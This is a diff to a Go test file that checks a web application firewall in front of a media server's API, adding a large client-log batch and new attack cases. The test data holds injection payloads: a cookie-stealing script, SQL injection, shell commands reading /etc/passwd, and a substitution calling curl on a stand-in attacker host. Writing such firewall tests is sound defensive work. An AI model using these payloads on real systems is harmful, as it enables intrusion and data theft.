@@ -70,6 +70,23 @@ var cvLogLines = []string{
 	"mse: SourceBuffer.appendBuffer failed: QuotaExceededError (buffer full); evicting 30 s",
 	"engine: gain -6.5 dB for track 01a19920-29a9-75c5-8d8b-d55e51a74318 (album mode)",
 	"[sync] position beacon queued: {\"index\":1,\"positionMs\":31275}",
+	"vue MetadataPanel hook: TypeError: Cannot read properties of null (reading 'runtime') | at t.immediate " +
+		"(https://media.example.com/assets/ItemPage-Qb7mWa2c.js:1:68615) | at xn (https://media.example.com/assets/" +
+		"runtime-core.esm-bundler-Lr4eWn9k.js:1:21616) | at async Promise.all (index 0)",
+}
+
+// cvLogBatch is a batch of the client's log as it sends one after lines
+// piled up: a note of those dropped, then 400 lines.
+func cvLogBatch(first string) map[string]any {
+	entries := []any{map[string]any{"t": 81.2, "level": "warn", "src": "diag", "msg": "dropped 37 lines"}}
+	for i := range 400 {
+		msg := cvLogLines[i%len(cvLogLines)]
+		if i == 0 && first != "" {
+			msg = first
+		}
+		entries = append(entries, map[string]any{"t": 81.2 + float64(i)/10, "level": "debug", "src": "player", "msg": msg})
+	}
+	return map[string]any{"page": "/watch/01a19920-29a9-75c5-8d8b-d55e51a74318", "entries": entries}
 }
 
 // cvTemplates are what a library's files are named by: Cavu's own layouts
@@ -354,6 +371,7 @@ func TestTheCavuSetLetsItsClientThrough(t *testing.T) {
 				send(cvBody("POST", "/api/v1/dev/client-log", map[string]any{"page": "/", "entries": []any{
 					map[string]any{"t": 1.5, "level": "warn", "src": "player", "msg": line}}}), "")
 			}
+			send(cvBody("POST", "/api/v1/dev/client-log", cvLogBatch("")), " (a full batch)")
 			for _, pw := range []string{`<Tr0ub4dor&3>`, `p@ss'w0rd"; --`, `correct horse; battery's "staple"`, "a;b|c`d$(e)"} {
 				send(cvBody("PUT", "/api/v1/admin/settings/smtp", map[string]any{"enabled": true, "host": "smtp.example.com", "port": 465,
 					"security": "tls", "username": "mailer", "password": pw, "from": "Cavu <no-reply@example.com>",
@@ -446,6 +464,7 @@ func TestTheCavuSetKeepsTheAttacks(t *testing.T) {
 		{1, cvBody("POST", api+"/dev/client-log", map[string]any{"entries": []any{map[string]any{"msg": "<script>alert(document.cookie)</script>"}}})},
 		{1, cvBody("POST", api+"/dev/client-log", map[string]any{"entries": []any{map[string]any{"msg": "x' UNION SELECT password FROM users--"}}})},
 		{1, cvBody("POST", api+"/dev/client-log", map[string]any{"entries": []any{map[string]any{"msg": "done; cat /etc/passwd"}}})},
+		{1, cvBody("POST", api+"/dev/client-log", map[string]any{"entries": []any{map[string]any{"msg": "done | ls -la"}}})},
 		{1, cvBody("POST", api+"/admin/libraries/"+item+"/organize/layout/validate", map[string]any{"template": "{title}/../../../etc/passwd"})},
 		{1, cvBody("POST", api+"/admin/libraries/"+item+"/organize/layout/validate", map[string]any{"template": "{title}{ext}; cat /etc/passwd"})},
 		{1, cvBody("POST", api+"/admin/libraries/"+item+"/organize/layout/validate", map[string]any{"template": "{title}$(curl attacker.example){ext}"})},
@@ -454,6 +473,12 @@ func TestTheCavuSetKeepsTheAttacks(t *testing.T) {
 		{1, cvBody("POST", api+"/pair", map[string]any{"client": "Cavu for Roku", "deviceName": "Den; cat /etc/passwd"})},
 	}
 	attacks := []cvAttack{
+		// Only the client's log goes past the thousand arguments the WAF
+		// reads, and is still read up to there. Only a line's text is not
+		// read for a pipe into a command.
+		{1, cvBody("POST", api+"/music/tracks/batch", map[string]any{"ids": slices.Repeat([]string{item}, 1001)})},
+		{1, cvBody("POST", api+"/dev/client-log", cvLogBatch("<script>alert(document.cookie)</script>"))},
+		{2, cvBody("POST", api+"/dev/client-log", map[string]any{"entries": []any{map[string]any{"src": "player | at now", "msg": "x"}}})},
 		// Without a character only the rules that count them see. Where
 		// the client sends ids, numbers and words these are marked, and
 		// read as CRS reads them.
@@ -548,6 +573,19 @@ func TestTheCavuSetKeepsTheAttacks(t *testing.T) {
 			}
 			check("attacks", bare, pl, attacks)
 			check("inText", bareText, 1, inText)
+			// The check for Windows commands reads a pipe into at too, so only
+			// the events say whether the check for a pipe into a command still
+			// reads a log line's other fields.
+			if pl >= 2 {
+				waitFor(t, "the pipe's event", func() bool {
+					_, ok := findEvent(out, func(e wafevent.Event) bool {
+						return slices.ContainsFunc(e.Rules, func(h wafevent.Hit) bool {
+							return h.ID == 932220 && strings.Contains(h.Data, "ARGS:json.entries.0.src")
+						})
+					})
+					return ok
+				})
+			}
 			// The count of special characters in cookies scores 3, too
 			// little to refuse alone, so its events say whether it read the
 			// cookie: never a session's or a sign-in's token, whatever its
